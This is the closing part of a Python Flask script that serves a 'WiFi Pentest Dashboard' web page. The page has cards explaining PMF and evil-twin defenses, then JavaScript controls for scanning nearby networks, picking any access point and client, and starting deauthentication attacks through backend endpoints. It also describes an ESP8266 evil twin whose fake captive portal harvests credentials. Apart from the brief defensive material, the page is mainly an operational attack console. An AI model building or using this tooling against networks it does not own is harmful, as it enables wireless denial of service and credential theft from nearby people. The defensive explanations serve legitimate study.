                <!-- AP -->
                <rect x="16" y="28" width="72" height="64" rx="4" fill="#161b22" stroke="#3fb950"/>
                <text x="52" y="24" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#3fb950">REAL AP</text>
                <text x="52" y="66" text-anchor="middle" font-size="18">📡</text>
                <text x="52" y="84" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#3fb950">PMF ON</text>

                <!-- Client -->
                <rect x="312" y="28" width="72" height="64" rx="4" fill="#161b22" stroke="#58a6ff"/>
                <text x="348" y="24" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#58a6ff">CLIENT</text>
                <text x="348" y="66" text-anchor="middle" font-size="18">💻</text>
                <text x="348" y="84" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#58a6ff">PMF required</text>

                <!-- Spoofed deauth packet traveling right -->
                <circle r="6" fill="#f85149" cx="110" cy="60">
                  <animateTransform attributeName="transform" type="translate" values="0,0;88,0" dur="1s" repeatCount="indefinite"/>
                  <animate attributeName="opacity" values="1;1;0;0" keyTimes="0;0.65;0.7;1" dur="1s" repeatCount="indefinite"/>
                </circle>

                <!-- Shield at blocking point -->
                <text x="214" y="70" text-anchor="middle" font-size="22" fill="#58a6ff">🛡</text>

                <!-- Blocked label -->
                <text x="214" y="98" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#58a6ff">SIGNATURE INVALID</text>
                <text x="214" y="110" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#58a6ff">FRAME DROPPED</text>

                <!-- Attacker label -->
                <text x="88" y="106" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149">Attacker (spoofed)</text>
              </svg>
            </div>
            <ul>
              <li>WPA3 makes PMF <strong>mandatory</strong> — cannot be disabled by client or AP</li>
              <li>WPA2 with PMF=Required blocks deauth; PMF=Optional remains vulnerable</li>
              <li>Devices running WPA3 (e.g. recent laptops) are fully immune to this attack</li>
              <li>Android phones on WPA2 are typically vulnerable unless the AP forces PMF</li>
            </ul>
          </div>
        </div>

        <div class="concept-card">
          <div class="concept-header">
            <div class="concept-num">05b</div>
            <div class="concept-title">Evil Twin Defenses</div>
          </div>
          <div class="concept-body">
            <p>Evil twin attacks are harder to block at the protocol level since they exploit legitimate client behavior. Defenses are mostly client-side and application-level:</p>
            <ul>
              <li><strong>VPN:</strong> All traffic encrypted end-to-end — even on evil twin, attacker sees only ciphertext</li>
              <li><strong>HTTPS + HSTS:</strong> Browser refuses plain HTTP; captive portal redirect fails on HSTS sites</li>
              <li><strong>Certificate pinning:</strong> Apps verifying a specific server certificate reject impersonation</li>
              <li><strong>WPA3-SAE:</strong> Handshake cannot be captured for offline cracking even if client connects</li>
              <li><strong>Disable auto-reconnect:</strong> Manually choosing networks prevents silent evil twin association</li>
              <li><strong>802.1X Enterprise:</strong> Server certificate must match — evil twin cannot present a valid cert</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

  </div><!-- end tab-learn -->

  <!-- NETWORKS TAB -->
  <div class="tab-panel" id="tab-scan">
    <div class="panel-title">Network Scanner</div>
    <div class="panel-sub">Live 802.11 network discovery — click a network to select it as target</div>

    <div class="card">
      <div class="card-title">Discovered Networks (<span id="net-count">0</span>)</div>
      <table class="data-table">
        <thead>
          <tr><th>ESSID</th><th>BSSID</th><th>CH</th><th>Signal</th><th>Encryption</th><th>AUTH</th></tr>
        </thead>
        <tbody id="networks-body">
          <tr><td colspan="6" class="empty"><div class="empty-icon">📡</div>Start scanning to discover networks</td></tr>
        </tbody>
      </table>
    </div>

    <div class="card">
      <div class="card-title">Selected Target</div>
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px">
        <div class="target-box">
          <div class="target-label">ESSID</div>
          <div class="target-val empty" id="sel-essid">none selected</div>
        </div>
        <div class="target-box">
          <div class="target-label">BSSID</div>
          <div class="target-val empty" id="sel-bssid">—</div>
        </div>
        <div class="target-box">
          <div class="target-label">Channel</div>
          <div class="target-val empty" id="sel-ch">—</div>
        </div>
      </div>
      <button class="btn btn-primary" id="lock-scan-btn" onclick="lockChannelScan()" disabled style="margin-top:12px">
        Lock Channel + Scan Clients for this AP
      </button>
      <div id="lock-hint" style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted);margin-top:8px;display:none"></div>
    </div>
  </div>

  <!-- CLIENTS TAB -->
  <div class="tab-panel" id="tab-clients">
    <div class="panel-title">Connected Clients</div>
    <div class="panel-sub">Stations detected near selected AP — select one to set as deauth target</div>

    <div class="card">
      <div class="card-title">Manual Target Entry</div>
      <p style="font-size:13px;color:var(--text-secondary);margin-bottom:14px">
        If your phone doesn't appear, find its MAC at: Settings → About → Status → Wi-Fi MAC Address
      </p>
      <div class="input-row">
        <div class="input-group">
          <label>AP BSSID</label>
          <input type="text" id="manual-bssid" placeholder="AA:BB:CC:DD:EE:FF" oninput="updateTargetFromManual()"/>
        </div>
        <div class="input-group">
          <label>Client MAC</label>
          <input type="text" id="manual-client" placeholder="11:22:33:44:55:66" oninput="updateTargetFromManual()"/>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">Stations (<span id="client-count">0</span>)</div>
      <table class="data-table">
        <thead>
          <tr><th>MAC Address</th><th>Associated BSSID</th><th>Signal</th><th>Frames</th><th>Probes</th></tr>
        </thead>
        <tbody id="clients-body">
          <tr><td colspan="4" class="empty"><div class="empty-icon">📱</div>No clients detected — scan must be running</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- ATTACK TAB -->
  <div class="tab-panel" id="tab-attack">
    <div class="panel-title">Attack Control</div>
    <div class="panel-sub">Deauthentication attack — only use on your own devices and network</div>

    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
      <div>
        <div class="card">
          <div class="card-title">Attack Targets</div>
          <div class="target-box">
            <div class="target-label">Target AP (BSSID)</div>
            <div class="target-val" id="atk-bssid">—</div>
          </div>
          <div class="target-box">
            <div class="target-label">Target Client</div>
            <div class="target-val" id="atk-client">—</div>
          </div>
          <div class="target-box">
            <div class="target-label">Monitor Interface</div>
            <div class="target-val" id="atk-iface">—</div>
          </div>
        </div>

        <div class="card">
          <div class="card-title">Deauth Control</div>
          <button class="big-btn big-btn-red" id="deauth-btn" onclick="toggleDeauth()">
            Start Deauth
          </button>
          <div class="counter-box">
            <div class="counter">
              <div class="counter-num" id="frame-count">0</div>
              <div class="counter-lbl">Packets Sent</div>
            </div>
            <div class="counter">
              <div class="counter-num" id="elapsed-time">0s</div>
              <div class="counter-lbl">Elapsed</div>
            </div>
          </div>
        </div>
      </div>

      <div>
        <div class="card">
          <div class="card-title">ESP8266 Evil Twin</div>
          <p style="font-size:13px;color:var(--text-secondary);line-height:1.7;margin-bottom:14px">
            The ESP8266 runs custom firmware that broadcasts an open Wi-Fi network with the same SSID set in the firmware code. When the deauth disconnects the victim, their device auto-connects to the open network and is served a fake captive portal to capture credentials.
          </p>
          <div class="target-box"><div class="target-label">How it works</div><div class="target-val" style="font-size:13px;font-family:var(--font-sans)">Open network — no password required</div></div>
          <div class="target-box"><div class="target-label">Captive portal</div><div class="target-val" style="font-size:13px;font-family:var(--font-sans)">HTTP traffic redirected to fake login page</div></div>
          <div class="target-box"><div class="target-label">Credential capture</div><div class="target-val" style="font-size:13px;font-family:var(--font-sans)">Submitted credentials stored on device memory</div></div>
        </div>

        <div class="card">
          <div class="card-title">What to Expect</div>
          <div class="target-box"><div class="target-label">Target Device</div><div class="target-val" style="color:var(--accent-warning);font-size:13px;font-family:var(--font-sans)">Phone disconnects from real AP within seconds</div></div>
          <div class="target-box"><div class="target-label">Evil Twin</div><div class="target-val" style="color:var(--accent-warning);font-size:13px;font-family:var(--font-sans)">Phone sees cloned SSID (open), may auto-connect</div></div>
          <div class="target-box"><div class="target-label">Portal</div><div class="target-val" style="color:var(--text-secondary);font-size:13px;font-family:var(--font-sans)">Fake login page shown — credentials harvested</div></div>
          <div class="target-box"><div class="target-label">PMF Devices</div><div class="target-val" style="color:var(--accent-danger);font-size:13px;font-family:var(--font-sans)">Deauth frames ignored if WPA3/PMF enabled</div></div>
        </div>
      </div>
    </div>
  </div>

</main>

<!-- LOG PANEL -->
<div class="log-panel">
  <div class="log-header">
    <span>Console Output</span>
    <button class="log-clear-btn" onclick="clearLogs()">Clear</button>
  </div>
  <div class="log-scroll" id="log-scroll"></div>
</div>

</div><!-- end .app -->

<script>
let selectedNetwork = null;
let selectedClient = null;
let logSince = 0;
let frameCount = 0;
let deauthStart = null;
let elapsedInterval = null;
let isDeauthing = false;

// Clock
setInterval(() => { document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
document.getElementById('clock').textContent = new Date().toLocaleTimeString();

// Learn steps
function setLearnStep(n) {
  document.querySelectorAll('.learn-step').forEach((el,i) => el.classList.toggle('active', i===n));
  document.querySelectorAll('.step-btn').forEach((el,i) => el.classList.toggle('active', i===n));
}

// Tab navigation
function showTab(name) {
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  document.querySelector(`[data-tab="${name}"]`).classList.add('active');
}

// API helper
async function api(endpoint, method='GET', body=null) {
  try {
    const opts = { method, headers: {'Content-Type':'application/json'} };
    if (body) opts.body = JSON.stringify(body);
    const r = await fetch(endpoint, opts);
    return await r.json();
  } catch(e) { return {error: e.message}; }
}

// Interfaces
async function loadInterfaces() {
  const data = await api('/api/interfaces');
  const sel = document.getElementById('iface-select');
  sel.innerHTML = '<option value="">— select interface —</option>';
  (data.interfaces || []).forEach(i => {
    const opt = document.createElement('option');
    opt.value = i; opt.textContent = i;
    sel.appendChild(opt);
  });
  if (data.monitor_active) {
    document.getElementById('atk-iface').textContent = data.monitor_active;
  }
}

// Monitor mode
async function startMonitor() {
  const iface = document.getElementById('iface-select').value;
  if (!iface) { alert('Select a wireless interface first'); return; }
  setBtn('mon-start-btn', true, 'Starting...');
  const data = await api('/api/monitor/start', 'POST', {interface: iface});
  setBtn('mon-start-btn', false, 'Enable Monitor');
  if (data.error) { alert('Error: ' + data.error); return; }
  document.getElementById('atk-iface').textContent = data.monitor_interface;
  await loadInterfaces();
}

async function stopMonitor() {
  if (!confirm('Stop monitor mode? This will kill active scans/deauth and restart NetworkManager.')) return;
  setBtn('mon-stop-btn', true, 'Stopping...');
  await api('/api/monitor/stop', 'POST');
  setBtn('mon-stop-btn', false, 'Disable Monitor');
  document.getElementById('atk-iface').textContent = '—';
  await loadInterfaces();
}

function setBtn(id, disabled, text) {
  const el = document.getElementById(id);
  if (!el) return;
  el.disabled = disabled;
  el.textContent = text;
}

// Scanning
async function startScan(channel, bssid) {
  const body = {};
  if (channel) body.channel = channel;
  if (bssid) body.bssid = bssid;
  const data = await api('/api/scan/start', 'POST', body);
  if (data.error) alert(data.error);
}

async function stopScan() { await api('/api/scan/stop', 'POST'); }

async function lockChannelScan() {
  if (!selectedNetwork) return;
  const { channel, bssid, essid } = selectedNetwork;
  const hint = document.getElementById('lock-hint');
  hint.style.display = 'block';
  hint.textContent = `Locked to ch.${channel} | BSSID: ${bssid} — scanning clients for "${essid}"`;
  await startScan(channel, bssid);
  showTab('clients');
}

// Network table
function powerToWidth(pwr) {
  const n = parseInt(pwr) || -100;
  return Math.max(0, Math.min(100, (n + 100) * 2));
}
function privacyBadge(priv) {
  if ((priv||'').includes('WPA3')) return `<span class="badge badge-wpa3">WPA3</span>`;
  if ((priv||'').includes('WPA2')) return `<span class="badge badge-wpa2">WPA2</span>`;
  if (priv === 'OPN') return `<span class="badge badge-open">OPEN</span>`;
  return `<span class="badge">${priv||'?'}</span>`;
}

function renderNetworks(networks) {
  const tbody = document.getElementById('networks-body');
  document.getElementById('net-count').textContent = networks.length;
  if (!networks.length) {
    tbody.innerHTML = '<tr><td colspan="6" class="empty"><div class="empty-icon">📡</div>Scanning… no networks yet</td></tr>';
    return;
  }
  tbody.innerHTML = networks.map((n,i) => `
    <tr onclick="selectNetwork(${i})" class="${selectedNetwork && selectedNetwork.bssid === n.bssid ? 'selected' : ''}">
      <td>${n.essid || '<em style="color:var(--text-muted)">hidden</em>'}</td>
      <td style="font-family:var(--font-mono);font-size:12px">${n.bssid}</td>
      <td>${n.channel}</td>
      <td>
        <span class="power-bar"><span class="power-fill" style="width:${powerToWidth(n.power)}%"></span></span>
        <span style="font-family:var(--font-mono);font-size:12px">${n.power} dBm</span>
      </td>
      <td>${privacyBadge(n.privacy)}</td>
      <td>${authBadge(n.auth)}</td>
    </tr>
  `).join('');
}

function authBadge(auth) {
  if (!auth || auth === '') return '<span class="badge" style="background:var(--bg-tertiary);color:var(--text-muted)">—</span>';

  const authUpper = auth.toUpperCase();
  if (authUpper === 'MGT') {
    return '<span class="badge" style="background:var(--accent-primary-bg);color:var(--accent-primary);border:1px solid var(--accent-primary)">MGT (Enterprise)</span>';
  }
  if (authUpper === 'PSK') {
    return '<span class="badge" style="background:var(--accent-warning-bg);color:var(--accent-warning);border:1px solid var(--accent-warning)">PSK (Password)</span>';
  }
  if (authUpper === 'SAE') {
    return '<span class="badge" style="background:var(--accent-success-bg);color:var(--accent-success);border:1px solid var(--accent-success)">SAE (WPA3)</span>';
  }
  if (authUpper === 'OPN' || authUpper === 'OPEN') {
    return '<span class="badge badge-open">OPEN</span>';
  }
  return `<span class="badge" style="background:var(--bg-tertiary);color:var(--text-secondary)">${auth}</span>`;
}

function selectNetwork(i) {
  const nets = window._lastNetworks || [];
  if (!nets[i]) return;
  selectedNetwork = nets[i];
  const setField = (id, val) => {
    const el = document.getElementById(id);
    if (!el) return;
    el.textContent = val;
    el.classList.remove('empty');
  };
  setField('sel-essid', selectedNetwork.essid || 'hidden');
  setField('sel-bssid', selectedNetwork.bssid);
  setField('sel-ch', selectedNetwork.channel);
  setField('atk-bssid', selectedNetwork.bssid);
  document.getElementById('manual-bssid').value = selectedNetwork.bssid;
  document.getElementById('lock-scan-btn').disabled = false;
  renderNetworks(nets);
}

// Client table
function renderClients(clients) {
  const tbody = document.getElementById('clients-body');
  const filtered = selectedNetwork
    ? clients.filter(c => c.ap_bssid === selectedNetwork.bssid)
    : clients;
  const all = filtered.length ? filtered : clients;
  document.getElementById('client-count').textContent = all.length;
  if (!all.length) {
    tbody.innerHTML = `<tr><td colspan="4" class="empty">
      <div class="empty-icon">📱</div>
      ${selectedNetwork ? 'No clients for this AP — use Lock Channel Scan on Networks tab' : 'Select a network first'}
    </td></tr>`;
    return;
  }
  tbody.innerHTML = all.map((c,i) => `
    <tr onclick="selectClient(${i})" class="${selectedClient && selectedClient.mac === c.mac ? 'selected' : ''}">
      <td style="font-family:var(--font-mono);font-size:12px">${c.mac}</td>
      <td style="font-family:var(--font-mono);font-size:12px;color:var(--text-muted)">${c.ap_bssid || '—'}</td>
      <td style="font-family:var(--font-mono);font-size:12px">${c.power} dBm</td>
      <td style="font-family:var(--font-mono);font-size:12px">${c.frames}</td>
      <td style="max-width:110px;overflow:hidden;text-overflow:ellipsis;font-size:11px;font-family:var(--font-mono)">${c.probes || '—'}</td>
    </tr>
  `).join('');
  window._lastClients = all;
}

function selectClient(i) {
  const data = window._lastClients || [];
  if (!data[i]) return;
  selectedClient = data[i];
  document.getElementById('atk-client').textContent = selectedClient.mac;
  document.getElementById('manual-client').value = selectedClient.mac;
  renderClients(window._lastClients);
}

function updateTargetFromManual() {
  const bssid = document.getElementById('manual-bssid').value.trim();
  const client = document.getElementById('manual-client').value.trim();
  if (bssid) document.getElementById('atk-bssid').textContent = bssid;
  if (client) document.getElementById('atk-client').textContent = client;
}

// Deauth
async function toggleDeauth() {
  if (isDeauthing) {
    await api('/api/deauth/stop', 'POST');
    isDeauthing = false;
    if (elapsedInterval) { clearInterval(elapsedInterval); elapsedInterval = null; }
    const btn = document.getElementById('deauth-btn');
    btn.textContent = 'Start Deauth';
    btn.classList.remove('active');
  } else {
    const bssid = document.getElementById('atk-bssid').textContent.trim();
    const client = document.getElementById('atk-client').textContent.trim();
    if (!bssid || bssid === '—') { alert('Set AP BSSID first — select a network from the Networks tab'); return; }
    if (!client || client === '—') { alert('Set client MAC first — select from Clients tab or enter manually'); return; }
    const data = await api('/api/deauth/start', 'POST', {bssid, client});
    if (data.error) { alert('Error: ' + data.error); return; }
    isDeauthing = true;
    frameCount = 0;
    deauthStart = Date.now();
    elapsedInterval = setInterval(() => {
      document.getElementById('elapsed-time').textContent = Math.floor((Date.now() - deauthStart) / 1000) + 's';
    }, 1000);
    const btn = document.getElementById('deauth-btn');
    btn.textContent = 'Stop Deauth';
    btn.classList.add('active');
  }
}

// Logs — clear both server and UI
async function clearLogs() {
  await api('/api/logs/clear', 'POST');
  document.getElementById('log-scroll').innerHTML = '';
  logSince = 0;
}

async function fetchLogs() {
  const data = await api(`/api/logs?since=${logSince}`);
  if (!data.logs || !data.logs.length) return;
  logSince = data.total;
  const container = document.getElementById('log-scroll');
  data.logs.forEach(l => {
    if (l.level === 'attack' && l.msg.toLowerCase().includes('deauth')) {
      frameCount++;
      document.getElementById('frame-count').textContent = frameCount;
    }
    const el = document.createElement('div');
    el.className = `log-entry log-${l.level}`;
    el.innerHTML = `<span class="log-time">${l.time}</span><span class="log-msg">${escHtml(l.msg)}</span>`;
    container.appendChild(el);
  });
  // Keep console manageable — max 80 entries visible
  while (container.children.length > 80) container.removeChild(container.firstChild);
  container.scrollTop = container.scrollHeight;
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// Status polling
async function pollStatus() {
  const data = await api('/api/status');
  const pm = document.getElementById('pill-mon');
  const ps = document.getElementById('pill-scan');
  const pd = document.getElementById('pill-deauth');
  if (data.monitor_interface) {
    pm.textContent = `MON: ${data.monitor_interface}`;
    pm.className = 'pill active';
    document.getElementById('atk-iface').textContent = data.monitor_interface;
  } else {
    pm.textContent = 'MONITOR: OFF';
    pm.className = 'pill';
  }
  ps.textContent = data.scanning ? `SCAN: ${data.network_count} APs` : 'SCAN: IDLE';
  ps.className = 'pill' + (data.scanning ? ' active' : '');
  pd.textContent = data.deauthing ? 'DEAUTH: ACTIVE' : 'DEAUTH: OFF';
  pd.className = 'pill' + (data.deauthing ? ' attacking' : '');

  // Sync UI if server stopped deauth externally (e.g. iface went away)
  if (!data.deauthing && isDeauthing) {
    isDeauthing = false;
    if (elapsedInterval) { clearInterval(elapsedInterval); elapsedInterval = null; }
    const btn = document.getElementById('deauth-btn');
    btn.textContent = 'Start Deauth';
    btn.classList.remove('active');
  }
}

async function pollScan() {
  const data = await api('/api/scan/results');
  window._lastNetworks = data.networks || [];
  window._lastClients = data.clients || [];
  renderNetworks(window._lastNetworks);
  renderClients(window._lastClients);
}

// Init
loadInterfaces();
setInterval(fetchLogs, 800);
setInterval(pollStatus, 2000);
setInterval(pollScan, 3000);
</script>
</body>
</html>'''

if __name__ == '__main__':
    print('\n  WiFi Pentest Dashboard')
    print('  Open: http://localhost:5000\n')
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
